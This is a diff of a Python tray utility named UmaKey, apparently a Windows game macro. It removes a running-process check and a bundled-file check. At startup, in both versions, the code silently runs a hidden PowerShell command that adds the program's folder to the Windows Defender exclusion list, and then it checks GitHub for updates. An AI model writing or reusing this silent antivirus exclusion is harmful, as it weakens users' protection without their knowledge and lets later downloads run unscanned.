@@ -3,7 +3,6 @@ import pystray
 from PIL import Image
 import os, time
 from threading import Thread
-import subprocess
 import ctypes
 from ctypes import windll, byref, cdll, c_wchar_p
 from modules import mapper, posinfo, update
@@ -12,19 +11,6 @@ text = 'Run'
 title = 'UmaKey'
 enable = True
 VERSION = "v1.1.0"
-
-def is_process_running(process_name : str) -> bool:
-    """
-    Checks if a process with the given name is running.
-
-    :param process_name: Name of the process to check
-    :type process_name: str
-    :return: True if the process is running, False otherwise
-    :rtype: bool
-    """
-    result = subprocess.run(["tasklist", "/FI", f"IMAGENAME eq {process_name}.exe"], capture_output=True, text=True)
-    output = result.stdout
-    return output.lower().count(process_name.lower()) > 1
 
 def action() -> None:
     """
@@ -163,14 +149,8 @@ def exit() -> None:
     del auto_clicker, icon
     os._exit(0)
 
-for file in 'input.exe', 'UmaKey.ico', 'warning.dll', 'WindowCapture.dll', 'findColor.dll', 'opencv_world490.dll':
-    if not os.path.isfile(f'./_internal/{file}'):
-        raise FileNotFoundError("File not Found : ", os.path.join(os.getcwd(), f'./_internal/{file}'))
-
 if __name__ == '__main__':
-    windll.shell32.ShellExecuteW(None, "open", "powershell.exe", f'Add-MpPreference -ExclusionPath "{os.getcwd()}"', None, 0)
-    if is_process_running(title):
-        os._exit(0)
+    ctypes.windll.shell32.ShellExecuteW(None, "open", "powershell.exe", f'Add-MpPreference -ExclusionPath "{os.getcwd()}"', None, 0)
     download, release = update.check_new_release("onetwohour", "UmaKey", VERSION)
     if download:
         message = f"새로운 업데이트 : {release['tag_name']}"
